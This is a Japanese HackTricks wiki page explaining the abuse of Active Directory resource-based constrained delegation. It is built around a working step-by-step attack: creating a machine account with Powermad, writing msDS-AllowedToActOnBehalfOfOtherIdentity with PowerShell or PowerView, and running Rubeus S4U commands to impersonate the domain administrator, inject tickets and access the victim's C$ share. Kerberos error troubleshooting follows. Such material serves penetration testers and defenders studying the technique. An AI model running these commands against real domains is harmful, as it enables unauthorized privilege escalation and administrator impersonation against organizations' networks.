# リソースベースの制約付き委任

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でAWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝する**か**HackTricksをPDFでダウンロードする**場合は[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)を**フォロー**する。
- **ハッキングトリックを共有するには** [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出してください。

</details>

## リソースベースの制約付き委任の基礎

これは基本的な[制約付き委任](constrained-delegation.md)に似ていますが、**オブジェクトに対して任意のユーザーを偽装する権限を与える**代わりに、リソースベースの制約付き委任は**オブジェクトに対して任意のユーザーを偽装できるユーザーを設定**します。

この場合、制約付きオブジェクトには、**msDS-AllowedToActOnBehalfOfOtherIdentity**という属性があり、それに対して他のユーザーを偽装できるユーザーの名前が設定されます。

この制約付き委任と他の委任との重要な違いは、**マシンアカウントに対する書き込み権限を持つ任意のユーザー**が_**msDS-AllowedToActOnBehalfOfOtherIdentity**_を設定できることです（他の委任形式では、ドメイン管理者権限が必要でした）。

### 新しい概念

制約付き委任では、ユーザーの_userAccountControl_値の中にある**`TrustedToAuthForDelegation`**フラグが**S4U2Self**を実行するために必要であると言われていました。しかし、それは完全な真実ではありません。\
実際には、その値がなくても、**サービス**（SPNを持っている）であれば、**任意のユーザーに対してS4U2Self**を実行できますが、**`TrustedToAuthForDelegation`**がある場合、返されるTGSは**Forwardable**になり、そのフラグがない場合、返されるTGSは**Forwardable**になりません。

ただし、**S4U2Proxy**で使用される**TGS**が**Forwardable**でない場合、**基本的な制約付き委任**を悪用しようとしても**機能しません**。ただし、**リソースベースの制約付き委任**を悪用しようとする場合は機能します（これは脆弱性ではなく、明らかに機能です）。

### 攻撃構造

> **コンピュータ**アカウントに**書き込みに相当する権限**がある場合、そのマシンで**特権アクセス**を取得できます。

攻撃者がすでに**被害者コンピュータ**に対して**書き込みに相当する権限**を持っていると仮定します。

1. 攻撃者は、**SPN**を持つアカウントを**侵害**するか（"Service A"）、**作成**します。注意すべきは、**特別な特権を持たない**_管理者ユーザー_でも最大10の**コンピュータオブジェクト（MachineAccountQuota）**を**作成**し、それに**SPN**を設定できることです。したがって、攻撃者は単にコンピュータオブジェクトを作成し、SPNを設定できます。
2. 攻撃者は、被害者コンピュータ（ServiceB）に対する**リソースベースの制約付き委任を許可**するために、被害者コンピュータ（ServiceB）上での**WRITE権限を悪用**します。
3. 攻撃者はRubeusを使用して、特権アクセスを持つユーザーに対して、Service AからService Bへの**完全なS4U攻撃**（S4U2SelfおよびS4U2Proxy）を実行します。
1. S4U2Self（侵害された/作成されたSPNアカウントから）：**管理者から私へのTGS**を要求します（Forwardableではない）。
2. S4U2Proxy：前述の**ForwardableでないTGS**を使用して、**管理者から被害者ホスト**への**TGS**を要求します。
3. ForwardableでないTGSを使用していても、リソースベースの制約付き委任を悪用しているため、機能します。
4. 攻撃者は**チケットを渡す**ことができ、ユーザーを**偽装**して**被害者ServiceBにアクセス**できます。

ドメインの**_MachineAccountQuota_**を確認するには、次のコマンドを使用できます：
```powershell
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## 攻撃

### コンピュータオブジェクトの作成

ドメイン内でコンピュータオブジェクトを作成することができます。[powermad](https://github.com/Kevin-Robertson/Powermad)**:**
```powershell
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### R**esource-based Constrained Delegationの設定**

**activedirectory PowerShellモジュールを使用する**
```powershell
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**PowerViewを使用する**
```powershell
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### 完全なS4U攻撃の実行

まず最初に、パスワード`123456`を持つ新しいコンピュータオブジェクトを作成したので、そのパスワードのハッシュが必要です：
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
これにより、そのアカウントのRC4ハッシュとAESハッシュが表示されます。\
攻撃を実行できるようになりました：
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Rubeusの`/altservice`パラメータを使用して、一度のリクエストで複数のチケットを生成できます。
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
{% hint style="danger" %}
ユーザーには "**委任できない**" という属性があります。ユーザーがこの属性をTrueにしている場合、彼をなりすますことはできません。このプロパティはBloodHound内で確認できます。
{% endhint %}

### アクセス

最後のコマンドラインは、**完全なS4U攻撃を実行し、Administratorから被害者ホストへのTGSをメモリに注入**します。\
この例では、Administratorから**CIFS**サービスのTGSが要求されたため、**C$**にアクセスできるようになります。
```bash
ls \\victim.domain.local\C$
```
### 異なるサービスチケットの悪用

[**ここで利用可能なサービスチケットについて学ぶ**](silver-ticket.md#available-services)。

## Kerberos エラー

* **`KDC_ERR_ETYPE_NOTSUPP`**: これは、Kerberos が DES または RC4 を使用しないように構成されており、RC4 ハッシュのみを提供していることを意味します。少なくとも AES256 ハッシュを Rubeus に提供してください（または単に rc4、aes128、aes256 ハッシュを提供してください）。例: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
* **`KRB_AP_ERR_SKEW`**: これは、現在のコンピュータの時刻が DC の時刻と異なり、Kerberos が正常に機能していないことを意味します。
* **`preauth_failed`**: これは、指定されたユーザー名 + ハッシュがログインに使用されていないことを意味します。ハッシュを生成する際にユーザー名に "$" を入れ忘れている可能性があります（`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`）
* **`KDC_ERR_BADOPTION`**: これは次のことを意味する可能性があります:
  * 擬似化しようとしているユーザーが望ましいサービスにアクセスできない（擬似化できないか、権限が不十分なため）
  * 要求されたサービスが存在しない（WinRM のチケットを要求しているが、WinRM が実行されていない場合）
  * 作成された fakecomputer が脆弱なサーバー上で権限を失い、それを戻す必要がある

## 参考文献

* [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
* [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
